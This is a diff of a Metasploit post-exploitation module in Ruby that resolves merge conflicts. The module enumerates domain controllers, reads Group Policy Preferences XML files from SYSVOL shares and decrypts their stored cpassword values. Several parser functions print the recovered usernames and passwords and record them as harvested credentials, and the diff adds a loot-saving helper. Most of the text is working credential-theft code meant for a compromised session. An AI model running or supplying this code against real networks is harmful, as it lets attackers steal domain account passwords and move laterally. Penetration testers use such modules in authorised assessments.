@@ -8,18 +8,12 @@
 require 'msf/core'
 require 'rex'
 require 'rexml/document'
-<<<<<<< HEAD
-=======
 require 'msf/core/post/windows/registry'
->>>>>>> upstream/master
 
 class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::Priv
-<<<<<<< HEAD
-=======
 	include Msf::Post::Windows::Registry
->>>>>>> upstream/master
 
 	def initialize(info={})
 		super( update_info( info,
@@ -30,35 +24,15 @@ class Metasploit3 < Msf::Post
 				files containing local user accounts and passwords and decrypts them
 				using Microsofts public AES key.
 
-<<<<<<< HEAD
-				Users can specify DOMAINS="domain1 domain2 domain3 etc" to target specific
-				domains on the network. This module will enumerate any domain controllers for
-				those domains.
-
-				Users can specify ALL=True to target all domains and their domain controllers
-				on the network.
-
-				Tested directly on a Win2k8 x64 DC, Win2k12RC x64 DC, and a Windows 7 x32 Client
-				Workstation.
-
-				Using the ALL or DOMAINS flags whilst on a DC will not enumerate that DC as it
-				is looking externally on the network for other Domain Controllers, however the
-				default (CURRENT=True which inspects the registry) should work successfully.
-=======
 				Tested on WinXP SP3 Client and Win2k8 R2 DC.
->>>>>>> upstream/master
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>[
 				'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
 				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
 				'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
-<<<<<<< HEAD
-				'TheLightCosine <thelightcosine[at]gmail.com>'
-=======
 				'TheLightCosine <thelightcosine[at]metasploit.com>',
 				'Rob Fuller <mubix[at]hak5.org>' #domain/dc enumeration code
->>>>>>> upstream/master
 				],
 			'References'    =>
 				[
@@ -71,144 +45,6 @@ class Metasploit3 < Msf::Post
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
-<<<<<<< HEAD
-		register_options(
-			[
-				OptBool.new('CURRENT', [ false, 'Enumerate current machine domain.', true]),
-				OptBool.new('ALL', [ false, 'Enumerate all domains on network.', false]),
-				OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".']),
-			], self.class)
-	end
-
-	def run
-		dcs = []
-		group_paths = []
-		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
-		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
-		service_paths = []
-		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
-		printer_paths = []
-		printer_path = "USER\\Preferences\\Printers\\Printers.xml"
-		drive_paths = []
-		drive_path = "USER\\Preferences\\Drives\\Drives.xml"
-		datasource_paths = []
-		datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
-		datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
-		task_paths = []
-		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
-		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
-
-		if !datastore['DOMAINS'].to_s.empty?
-			user_domains = datastore['DOMAINS'].to_s.split(' ')
-			print_status "User supplied domains #{user_domains}"
-
-			user_domains.each do |domain_name|
-				found_dcs = enum_dcs(domain_name)
-				dcs << found_dcs[0] unless found_dcs.to_a.empty?
-			end
-		elsif datastore['ALL']
-			enum_domains.each do |domain|
-				domain_name = domain[:domain]
-				if  domain_name == "WORKGROUP" || domain_name.empty?
-					print_status "Skipping '#{domain_name}'..."
-					next
-				end
-
-				found_dcs = enum_dcs(domain_name)
-				# We only wish to enumerate one DC for each Domain.
-				dcs << found_dcs[0] unless found_dcs.to_a.empty?
-			end
-		elsif datastore['CURRENT']
-			dcs << get_domain_controller
-		else
-			print_error "Invalid Arguments, please supply one of CURRENT, ALL or DOMAINS arguments"
-			return nil
-		end
-
-		dcs = dcs.flatten.compact
-
-		if dcs.length < 1
-			return nil
-		end
-
-		dcs.each do |dc|
-			print_status "Searching on #{dc}..."
-			sysvol_path = "\\\\#{dc}\\SYSVOL\\"
-			begin
-				# Enumerate domain folders
-				session.fs.dir.foreach(sysvol_path) do |domain_dir|
-					next if domain_dir =~ /^(\.|\.\.)$/
-					domain_path = "#{sysvol_path}#{domain_dir}\\Policies\\"
-					print_status "Looking in domain folder #{domain_path}"
-					# Enumerate policy folders {...}
-					begin
-						session.fs.dir.foreach(domain_path) do |policy_dir|
-							next if policy_dir =~ /^(\.|\.\.)$/
-							policy_path = "#{domain_path}\\#{policy_dir}"
-							group_paths << find_path(policy_path, group_path)
-							group_paths << find_path(policy_path, group_path_user)
-							service_paths << find_path(policy_path, service_path)
-							printer_paths << find_path(policy_path, printer_path)
-							drive_paths << find_path(policy_path, drive_path)
-							datasource_paths << find_path(policy_path, datasource_path)
-							datasource_paths << find_path(policy_path, datasource_path_user)
-							task_paths << find_path(policy_path, task_path)
-							task_paths << find_path(policy_path, task_path_user)
-						end
-					rescue Rex::Post::Meterpreter::RequestError => e
-						print_error "Received error code #{e.code} when reading #{domain_path}"
-					end
-				end
-			rescue Rex::Post::Meterpreter::RequestError => e
-				print_error "Received error code #{e.code} when reading #{sysvol_path}"
-			end
-		end
-
-		group_paths = group_paths.flatten.compact
-		service_paths = service_paths.flatten.compact
-		printer_paths = printer_paths.flatten.compact
-		drive_paths = drive_paths.flatten.compact
-		datasource_paths = datasource_paths.flatten.compact
-		task_paths = task_paths.flatten.compact
-
-		print_status "Results from Groups.xml:"
-		group_paths.each do |path|
-			mxml, dc = get_xml(path)
-			parse_group_xml(mxml, dc)
-		end
-
-		print_status "Results from Services.xml:"
-		service_paths.each do |path|
-			mxml, dc = get_xml(path)
-			parse_service_xml(mxml, dc)
-		end
-
-		print_status "Results from Printers.xml:"
-		printer_paths.each do |path|
-			mxml, dc = get_xml(path)
-			parse_printer_xml(mxml, dc)
-		end
-
-		print_status "Results from Drives.xml:"
-		drive_paths.each do |path|
-			mxml, dc = get_xml(path)
-			parse_drive_xml(mxml, dc)
-		end
-
-		print_status "Results from DataSources.xml:"
-		datasource_paths.each do |path|
-			mxml, dc = get_xml(path)
-			parse_datasource_xml(mxml, dc)
-		end
-
-		print_status "Results from ScheduledTasks.xml:"
-		task_paths.each do |path|
-			mxml, dc = get_xml(path)
-			parse_scheduled_task_xml(mxml, dc)
-		end
-	end
-
-=======
 		register_options([
 			OptBool.new('ALL', [ false, 'Enumerate all domains on network.', true]),
 			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
@@ -230,18 +66,17 @@ class Metasploit3 < Msf::Post
 		dcs = []
 		basepaths = []
 		fullpaths = []
-		@enumed_domains = []
 
 		print_status "Checking locally.."
 		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
 		unless locals.blank?
 			basepaths << locals
-			print_good "Policy Sahres found locally"
+			print_good "Policy Shares found locally"
 		end
 
 		if datastore['ALL'] and datastore['DOMAINS'].blank?
 			domains = enum_domains
-			domains.reject!{|n| n == "WORKGROUP"}
+			domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
 		end
 
 		datastore['DOMAINS'].split('').each{|ud| domains << ud} if datastore['DOMAINS']
@@ -314,7 +149,6 @@ class Metasploit3 < Msf::Post
 	end
 
 
->>>>>>> upstream/master
 	def find_path(path, xml_path)
 		xml_path = "#{path}\\#{xml_path}"
 		begin
@@ -325,146 +159,13 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-<<<<<<< HEAD
-	def get_xml(path)
-=======
 	def gpp_xml_file(path)
->>>>>>> upstream/master
 		begin
 			groups = client.fs.file.new(path,'r')
 			until groups.eof
 				data = groups.read
 			end
 
-<<<<<<< HEAD
-			domain = path.split('\\')[2]
-
-			mxml = REXML::Document.new(data).root
-
-			return mxml, domain
-		rescue Rex::Post::Meterpreter::RequestError => e
-				print_error "Received error code #{e.code} when reading #{path}"
-		end
-	end
-
-	def parse_service_xml(mxml,domain_controller)
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-
-			user = node.attributes['accountName']
-			service_name = node.attributes['serviceName']
-
-			changed = node.parent.attributes['changed']
-
-			pass = decrypt(epassword)
-
-			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} SERVICE: #{service_name} CHANGED: #{changed}"
-			report_creds(user,pass)
-		end
-	end
-
-	def parse_printer_xml(mxml,domain_controller)
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-
-			user = node.attributes['username'] #lowercase in MSDN
-			path = node.attributes['path']
-
-			changed = node.parent.attributes['changed']
-
-			pass = decrypt(epassword)
-
-			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} PATH: #{path} CHANGED: #{changed}"
-			report_creds(user,pass)
-		end
-	end
-
-	def parse_drive_xml(mxml,domain_controller)
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-
-			user = node.attributes['userName'] #lowercase in MSDN but camelCase in practice
-			path = node.attributes['path']
-
-			changed = node.parent.attributes['changed']
-
-			pass = decrypt(epassword)
-
-			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} PATH: #{path} CHANGED: #{changed}"
-			report_creds(user,pass)
-		end
-	end
-
-	def parse_datasource_xml(mxml,domain_controller)
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-
-			user = node.attributes['username'] #lowercase in MSDN
-			dsn = node.attributes['dsn']
-
-			changed = node.parent.attributes['changed']
-
-			pass = decrypt(epassword)
-
-			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DSN: #{dsn} CHANGED: #{changed}"
-			report_creds(user,pass)
-		end
-	end
-
-	def parse_scheduled_task_xml(mxml,domain_controller)
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-
-			user = node.attributes['runAs']
-			task_name = node.attributes['name']
-
-			changed = node.parent.attributes['changed']
-
-			pass = decrypt(epassword)
-
-			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} Task: #{task_name} CHANGED: #{changed}"
-			report_creds(user,pass)
-		end
-	end
-
-	def parse_group_xml(mxml,domain_controller)
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-
-			user = node.attributes['userName']
-			newname = node.attributes['newName']
-			disabled = node.attributes['acctDisabled']
-			action = node.attributes['action']
-			expires = node.attributes['expires']
-			never_expires = node.attributes['neverExpires']
-			description = node.attributes['description']
-			full_name = node.attributes['fullName']
-			no_change = node.attributes['noChange']
-			change_logon = node.attributes['changeLogon']
-			sub_authority = node.attributes['subAuthority']
-
-			changed = node.parent.attributes['changed']
-
-			# Check if policy also specifies the user is renamed.
-			if !newname.to_s.empty?
-				user = newname
-			end
-
-			pass = decrypt(epassword)
-
-			print_good "DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DISABLED: #{disabled} CHANGED: #{changed}"
-
-			report_creds(user,pass)
-		end
-	end
-
-=======
 			spath = path.split('\\')
 			retobj = {
 				:dc     => spath[2],
@@ -489,8 +190,6 @@ class Metasploit3 < Msf::Post
 		mxml.elements.to_a("//Properties").each do |node|
 			epassword = node.attributes['cpassword']
 			next if epassword.to_s.empty?
-			next if @enumed_domains.include? xmlfile[:domain]
-			@enumed_domains << xmlfile[:domain]
 			pass = decrypt(epassword)
 
 			user = node.attributes['runAs'] if node.attributes['runAs']
@@ -503,7 +202,6 @@ class Metasploit3 < Msf::Post
 			expires = node.attributes['expires']
 			never_expires = node.attributes['neverExpires']
 			disabled = node.attributes['acctDisabled']
-
 
 			table = Rex::Ui::Text::Table.new(
 				'Header'     => 'Group Policy Credential Info',
@@ -525,14 +223,18 @@ class Metasploit3 < Msf::Post
 			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
 			table << ["DISABLED", disabled] unless disabled.blank?
 
-
 			print_good table.to_s
 			report_creds(user,pass) unless disabled and disabled == '1'
 		end
 	end
 
-
->>>>>>> upstream/master
+	#	
+	# Save the raw version of unattend.xml	
+	#	
+	def save_raw(data)		
+		store_loot('windows.gpp.raw', 'text/xml', session, data)	
+	end
+	
 	def report_creds(user, pass)
 		if session.db_record
 			source_id = session.db_record.id
@@ -567,11 +269,7 @@ class Metasploit3 < Msf::Post
 		return pass
 	end
 
-<<<<<<< HEAD
-	#enum_domains.rb
-=======
 
->>>>>>> upstream/master
 	def enum_domains
 		print_status "Enumerating Domains on the Network..."
 		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
@@ -608,21 +306,13 @@ class Metasploit3 < Msf::Post
 				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
 				nameptr = mem[(base + 4),4].unpack("V*")[0]
 				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-<<<<<<< HEAD
-				domains << x
-=======
 				domains << x[:domain]
->>>>>>> upstream/master
 				base = base + 8
 		end
 
 		return domains
 	end
 
-<<<<<<< HEAD
-	#enum_domains.rb
-=======
->>>>>>> upstream/master
 	def enum_dcs(domain)
 		print_status("Enumerating DCs for #{domain}")
 		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
@@ -633,11 +323,7 @@ class Metasploit3 < Msf::Post
 			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
 		end
 		if result['totalentries'] == 0
-<<<<<<< HEAD
-			print_error "No Domain Controllers found for #{domain}"
-=======
 			print_error("No Domain Controllers found for #{domain}")
->>>>>>> upstream/master
 			return nil
 		end
 
@@ -647,11 +333,7 @@ class Metasploit3 < Msf::Post
 		base = 0
 		mem = client.railgun.memread(startmem, 8*count)
 		hostnames = []
-<<<<<<< HEAD
-		count.times do |i|
-=======
 		count.times{|i|
->>>>>>> upstream/master
 			t = {}
 			t[:platform] = mem[(base + 0),4].unpack("V*")[0]
 			nameptr = mem[(base + 4),4].unpack("V*")[0]
@@ -659,49 +341,6 @@ class Metasploit3 < Msf::Post
 			base = base + 8
 			print_good "DC Found: #{t[:dc_hostname]}"
 			hostnames << t[:dc_hostname]
-<<<<<<< HEAD
-		end
-
-		return hostnames
-	end
-
-	#enum_domain.rb
-	def reg_getvaldata(key,valname)
-		value = nil
-		begin
-			root_key, base_key = client.sys.registry.splitkey(key)
-			open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
-			v = open_key.query_value(valname)
-			value = v.data
-			open_key.close
-		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
-		end
-
-		return value
-	end
-
-	#enum_domain.rb
-	def get_domain_controller()
-		domain = nil
-		begin
-			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
-			v_name = "DCName"
-			domain = reg_getvaldata(subkey, v_name)
-		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
-		end
-
-		if domain.nil?
-			print_error "No domain controller retrieved - is this machine part of a domain?"
-			return nil
-		else
-			return domain.sub!(/\\\\/,'')
-		end
-	end
-end
-
-=======
 		}
 		return hostnames
 	end
@@ -721,4 +360,3 @@ end
 	end
 
 end
->>>>>>> upstream/master
